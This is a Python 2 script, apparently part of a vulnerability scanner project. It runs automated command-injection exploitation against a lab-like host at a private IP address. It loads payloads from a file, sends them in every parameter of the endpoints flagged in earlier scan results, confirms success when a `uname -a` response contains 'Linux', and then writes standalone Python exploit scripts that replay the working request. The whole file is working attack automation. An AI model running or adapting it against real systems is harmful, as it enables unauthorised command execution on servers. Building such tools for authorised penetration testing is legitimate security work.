import json
from scanner import make_request
from scanner import make_auth_request

COOKIE_HTTP_HEADER = {'Cookie': 'testcookie'}

with open('./vulnScanScripts/commandInjExploitPayloads.txt') as f:
 commandExecExploitList = list(f)

def exploit(vulnJSON):
    exploitType = vulnJSON['class']
    exploitDetails = vulnJSON['results'][hostname]

    # Generate exploitation script for command injection
    if exploitType == 'Command Injection':
        for index, exploitDetail in enumerate(exploitDetails):
            method = exploitDetail['method']
            params = exploitDetail['params']
            url = hostname + exploitDetail['endpoint']
            for key in params.keys():
                for y in commandExecExploitList:
                    params[key] = y.replace("\n", "")
                    #response = make_request(method, url, method_params)
                    response = make_auth_request(method, url, params, COOKIE_HTTP_HEADER)
                    print "\n[*]Searching for the correct exploit..."
                    print "[*]Payload used: " + str(params)
                    print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
                    print "[*]Response content length: " + str(response.headers['content-length'])
                    print "[*]Response content: \n" + response.content
                    if response.content.find("Linux") != -1: #Aim of logic is to execute uname -a.
                        print "[*]Exploit found! Generating standalone attack script..."

                        #Generate standalone exploit script to execute uname -a
                        with open('generatedExploits/command_injection'+str(params.keys())+str(index)+'.py', 'w') as exploitFile:
                            if method == "POST":
                                exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                                exploitFile.write('response = requests.post("'+url+'",'+str(params)+')\n')
                                exploitFile.write("print response.content")

                            elif method == "GET":
                                exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                                exploitFile.write('response = requests.get("'+url+'",'+str(params)+')\n')
                                exploitFile.write("print response.content")
                        break
    else:
        print exploitType

if __name__ == '__main__':
    hostname = "http://192.168.56.101"
    with open('logs/scan_results.json', 'r') as file:
        resultsJSON = json.loads(file.read())
        for key in resultsJSON.keys():
            exploit(resultsJSON[key])